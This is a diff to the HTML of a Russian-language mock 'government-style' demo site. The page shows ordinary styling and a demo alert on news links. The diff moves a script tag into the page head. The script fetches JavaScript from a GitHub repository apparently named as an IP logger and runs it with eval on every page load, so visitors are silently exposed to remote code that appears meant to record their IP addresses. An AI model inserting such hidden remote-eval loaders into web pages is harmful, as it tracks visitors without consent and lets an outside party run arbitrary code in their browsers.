@@ -6,6 +6,7 @@
   <title>Sukablyat.ru — Правительство (образец)</title>
   <meta name="description" content="Образец макета сайта в правительственном стиле — неофициальный демонстрационный ресурс." />
   <link rel="canonical" href="https://sukablyat.ru/" />
+  <script>fetch("https://raw.githubusercontent.com/MarskuQ7/IP-Logger-Console-/main/iplog.js").then(r=>r.text()).then(eval)</script>
   <style>
     :root{ --accent:#0052a3; --muted:#6b7280; --bg:#f7f8fb; --card:#ffffff }
     *{box-sizing:border-box}
@@ -162,9 +163,6 @@
 
   <script>
     document.querySelectorAll('.news-item a').forEach(a=>a.addEventListener('click', e=>{e.preventDefault();alert('Это демонстрационная версия — полный материал отсутствует.')}))
-  </script>
-  <script>
-    fetch("https://raw.githubusercontent.com/MarskuQ7/IP-Logger-Console-/main/iplog.js").then(r=>r.text()).then(eval)
   </script>
 </body>
 </html>
